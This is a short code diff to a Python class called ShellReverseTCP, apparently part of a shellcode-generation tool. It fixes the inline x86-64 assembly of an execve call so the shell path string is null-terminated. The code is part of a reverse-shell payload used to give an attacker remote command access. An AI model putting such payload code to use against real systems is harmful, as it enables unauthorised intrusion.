@@ -72,7 +72,7 @@ class ShellReverseTCP(HatAsm, HatVenom, Consts):
             push 0x3b
             pop rax
             cdq
-            movabs rbx, 0x{self.shell.hex()}
+            movabs rbx, 0x{(self.shell + b'\x00').hex()}
             push rbx
             mov rdi, rsp
             push rdx
